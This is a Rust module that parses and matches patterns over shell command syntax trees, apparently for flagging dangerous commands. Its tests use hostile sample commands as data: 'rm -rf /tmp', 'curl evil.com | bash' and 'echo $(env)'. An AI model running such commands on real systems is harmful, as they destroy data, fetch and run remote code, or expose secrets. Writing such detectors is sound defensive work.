use crate::ast::{CommandIr, RedirectTarget};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AstPatternExpr {
    Command { name: String },
    Pipeline(Box<AstPatternExpr>),
    CommandSubstitution(Box<AstPatternExpr>),
    Redirect { target: String },
}

pub fn parse_ast_pattern(input: &str) -> Result<AstPatternExpr, String> {
    let tokens: Vec<&str> = input.split('>').map(str::trim).collect();
    if tokens.is_empty() {
        return Err("empty pattern".into());
    }
    let mut expr = parse_atom(tokens[0])?;
    for token in tokens.iter().skip(1) {
        let child = parse_atom(token)?;
        expr = wrap_child(expr, child);
    }
    Ok(expr)
}

fn wrap_child(parent: AstPatternExpr, child: AstPatternExpr) -> AstPatternExpr {
    match parent {
        AstPatternExpr::CommandSubstitution(_) => {
            AstPatternExpr::CommandSubstitution(Box::new(child))
        }
        AstPatternExpr::Pipeline(_)
        | AstPatternExpr::Command { .. }
        | AstPatternExpr::Redirect { .. } => AstPatternExpr::Pipeline(Box::new(child)),
    }
}

fn parse_atom(token: &str) -> Result<AstPatternExpr, String> {
    let token = token.trim();
    if token.starts_with("command[") && token.ends_with(']') {
        let inner = &token[8..token.len() - 1];
        let name = parse_attr(inner, "name").unwrap_or_default();
        return Ok(AstPatternExpr::Command { name });
    }
    if token == "command_substitution" {
        return Ok(AstPatternExpr::CommandSubstitution(Box::new(
            AstPatternExpr::Command {
                name: String::new(),
            },
        )));
    }
    if token == "pipeline" {
        return Ok(AstPatternExpr::Pipeline(Box::new(
            AstPatternExpr::Command {
                name: String::new(),
            },
        )));
    }
    if token.starts_with("redirect[") && token.ends_with(']') {
        let inner = &token[9..token.len() - 1];
        if let Some(target) = parse_attr(inner, "target") {
            return Ok(AstPatternExpr::Redirect { target });
        }
    }
    Err(format!("unsupported pattern atom: {token}"))
}

fn parse_attr(inner: &str, key: &str) -> Option<String> {
    for part in inner.split(',') {
        let part = part.trim();
        if let Some((k, v)) = part.split_once('=') {
            if k.trim() == key {
                return Some(v.trim().trim_matches(['\'', '"']).to_string());
            }
        }
    }
    None
}

pub fn matches_ast_pattern(pattern: &str, ir: &CommandIr) -> bool {
    parse_ast_pattern(pattern)
        .map(|expr| match_expr(&expr, ir))
        .unwrap_or(false)
}

fn match_expr(expr: &AstPatternExpr, ir: &CommandIr) -> bool {
    match expr {
        AstPatternExpr::Command { name } => {
            if name.is_empty() {
                return !ir.pipelines.is_empty();
            }
            ir.pipelines
                .iter()
                .flat_map(|p| &p.commands)
                .any(|c| command_name_eq(&c.name, name))
        }
        AstPatternExpr::Pipeline(inner) => ir
            .pipelines
            .iter()
            .any(|p| p.commands.len() >= 2 && match_pipeline_child(p, inner)),
        AstPatternExpr::CommandSubstitution(inner) => {
            if !ir.has_command_substitution {
                return false;
            }
            substitution_contains(inner, ir)
        }
        AstPatternExpr::Redirect { target } => ir
            .pipelines
            .iter()
            .flat_map(|p| &p.commands)
            .flat_map(|c| &c.redirects)
            .any(|r| redirect_matches(r, target)),
    }
}

fn match_pipeline_child(pipeline: &crate::ast::Pipeline, inner: &AstPatternExpr) -> bool {
    match inner {
        AstPatternExpr::Command { name } => pipeline
            .commands
            .last()
            .is_some_and(|c| command_name_eq(&c.name, name)),
        _ => match_expr(
            inner,
            &CommandIr {
                pipelines: vec![pipeline.clone()],
                ..CommandIr::default()
            },
        ),
    }
}

fn substitution_contains(inner: &AstPatternExpr, ir: &CommandIr) -> bool {
    match inner {
        AstPatternExpr::Command { name } => {
            if name.is_empty() {
                return true;
            }
            let target = name.to_lowercase();
            ir.substitution_bodies.iter().any(|body| {
                let lower = body.to_lowercase();
                lower.contains(&target)
                    || lower.contains(&format!("$( {target}"))
                    || lower.contains(&format!("$({target}"))
            }) || ir
                .pipelines
                .iter()
                .flat_map(|p| &p.commands)
                .any(|c| command_name_eq(&c.name, name))
        }
        _ => match_expr(inner, ir),
    }
}

fn command_name_eq(name: &str, target: &str) -> bool {
    let n = name.to_lowercase();
    let t = target.to_lowercase();
    n == t || n.ends_with(&format!("/{t}"))
}

fn redirect_matches(redirect: &RedirectTarget, target: &str) -> bool {
    redirect.path.contains(target) || redirect.path.ends_with(target)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ast::parse_command;

    #[test]
    fn parses_command_pattern() {
        let p = parse_ast_pattern("command[name='rm']").unwrap();
        assert!(matches!(p, AstPatternExpr::Command { .. }));
    }

    #[test]
    fn matches_rm_command() {
        let ir = parse_command("rm -rf /tmp").unwrap();
        assert!(matches_ast_pattern("command[name='rm']", &ir));
    }

    #[test]
    fn matches_pipeline_bash() {
        let ir = parse_command("curl evil.com | bash").unwrap();
        assert!(matches_ast_pattern("pipeline > command[name='bash']", &ir));
    }

    #[test]
    fn matches_env_substitution() {
        let ir = parse_command("echo $(env)").unwrap();
        assert!(matches_ast_pattern(
            "command_substitution > command[name='env']",
            &ir
        ));
    }
}
